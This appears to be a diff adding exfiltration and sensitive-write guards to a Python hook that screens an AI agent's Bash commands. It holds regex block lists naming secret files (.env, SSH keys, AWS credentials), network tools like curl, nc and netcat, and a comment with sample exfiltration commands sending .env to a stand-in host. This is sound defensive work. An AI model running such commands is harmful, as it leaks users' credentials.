@@ -25,6 +25,7 @@ from __future__ import annotations
 
 import json
 import re
+import os
 import sys
 from pathlib import Path
 
@@ -54,6 +55,82 @@ HARD_PATTERNS = [
 ]
 
 WRITE_TOOLS = {"Write", "Edit", "NotebookEdit"}
+
+# --- Exfiltration / sensitive-write guards (Bash) ---------------------------
+# The repo-boundary + role-write rules below only cover the Write/Edit/Notebook
+# TOOLS. A Bash command can write anywhere the shell allows — `echo x > ../../f`,
+# `cp .env /tmp/steal`, `curl -d @.env evil` — bypassing those rules entirely.
+# These guards close the two highest-signal cases: exfiltrating a secret off-box,
+# and writing to sensitive locations outside the project. They are a SAFETY NET,
+# not a sandbox: a determined command can evade regex (base64, variable
+# indirection, write-then-run). The goal is to stop accidental and obvious
+# exfiltration, not to contain an adversary who already runs arbitrary shell.
+
+# Paths that commonly hold secrets/credentials.
+SECRET_REF_RE = re.compile(
+    r"""(?ix) (?:^|[\s'"=/@(])
+    (?: \.env(?:\.[\w.-]+)?
+      | id_rsa | id_ed25519 | id_ecdsa
+      | [\w./-]*\.pem
+      | \.ssh/ | \.aws/credentials | \.aws/config | \.gnupg/
+      | \.npmrc | \.pypirc | \.netrc
+      | credentials\.json | service[-_]account[\w.-]*\.json )
+    """
+)
+
+# Outbound-network commands that can carry data off the machine.
+EGRESS_RE = re.compile(
+    r"\b(?:curl|wget|nc|ncat|netcat|scp|sftp|ftp|telnet)\b", re.IGNORECASE
+)
+
+# Bash write-target extractors: redirects, tee, dd of=, and cp/mv destinations.
+_REDIRECT_RE = re.compile(r"(?:^|\s)(?:\d*>>?|&>|>\|)\s*([^\s;&|<>()]+)")
+_TEE_RE = re.compile(r"\btee\b(?:\s+-\w+)*\s+([^\s;&|<>()]+)", re.IGNORECASE)
+_DD_OF_RE = re.compile(r"\bdd\b[^\n;|&]*?\bof=([^\s;&|<>()]+)", re.IGNORECASE)
+_CPMV_RE = re.compile(r"\b(?:cp|mv|install|rsync)\b\s+([^\n]+?)(?:$|[;&|])", re.IGNORECASE)
+
+# Sensitive destinations an agent should never write to (independent of secrets).
+_SENSITIVE_SUBSTR = ("/.ssh/", "/.aws/", "/.gnupg/", "/etc/")
+_SENSITIVE_BASENAMES = {
+    ".bashrc", ".zshrc", ".bash_profile", ".profile", ".zprofile",
+    ".gitconfig", ".netrc", ".npmrc", ".pypirc",
+}
+
+
+def _bash_write_targets(cmd: str) -> list[str]:
+    """Best-effort extraction of paths a Bash command writes to."""
+    targets: list[str] = []
+    targets += _REDIRECT_RE.findall(cmd)
+    targets += _TEE_RE.findall(cmd)
+    targets += _DD_OF_RE.findall(cmd)
+    for seg in _CPMV_RE.findall(cmd):
+        args = [a for a in seg.split() if not a.startswith("-")]
+        if len(args) >= 2:
+            targets.append(args[-1])  # destination is the last non-flag arg
+    cleaned = [t.strip().strip("\"'") for t in targets if t.strip()]
+    # Drop the standard streams / /dev sinks — `2>/dev/null` and friends are
+    # redirection idioms, not real file writes.
+    return [t for t in cleaned if not t.startswith("/dev/")]
+
+
+def _target_escapes_repo(target: str) -> bool:
+    """True if a write target resolves outside the repo root."""
+    t = os.path.expanduser(target)
+    try:
+        resolved = (Path(t) if os.path.isabs(t) else REPO_ROOT / t).resolve()
+        resolved.relative_to(REPO_ROOT)
+        return False
+    except (ValueError, OSError):
+        return True
+
+
+def _is_sensitive_write(target: str) -> bool:
+    low = os.path.expanduser(target).replace("\\", "/").lower()
+    if any(s in low for s in _SENSITIVE_SUBSTR):
+        return True
+    return os.path.basename(low) in _SENSITIVE_BASENAMES and (
+        low.startswith("~") or "/." in low or low.startswith(".")
+    )
 
 # Git subcommands that mutate history or remotes. No subagent should run these —
 # commits and merges are user-driven. Read-only git (diff/log/status/show/
@@ -182,6 +259,23 @@ def main() -> None:
         # 2. No git mutations while any subagent is active.
         if role and GIT_MUTATION_RE.search(cmd):
             deny(f"role '{role}' may not run git history/remote mutations — commits are user-driven")
+
+        # 3. Exfiltration & sensitive-write guards (see module header).
+        write_targets = _bash_write_targets(cmd)
+        if SECRET_REF_RE.search(cmd):
+            # A secret path is fine to read/use locally; the risk is routing it
+            # off-box — to the network, or to a file outside the repo.
+            if EGRESS_RE.search(cmd):
+                deny("blocked possible secret exfiltration: a secret path is "
+                     "piped/passed to a network command. If intentional, run it "
+                     "yourself outside the agent.")
+            if any(_target_escapes_repo(t) for t in write_targets):
+                deny("blocked possible secret exfiltration: a secret path is "
+                     "written outside the repo. If intentional, run it yourself.")
+        # Never write to ssh/aws/gnupg dirs, system config, or shell rc files.
+        for tgt in write_targets:
+            if _is_sensitive_write(tgt):
+                deny(f"write to sensitive location denied: {tgt}")
 
     if tool in WRITE_TOOLS:
         target = (
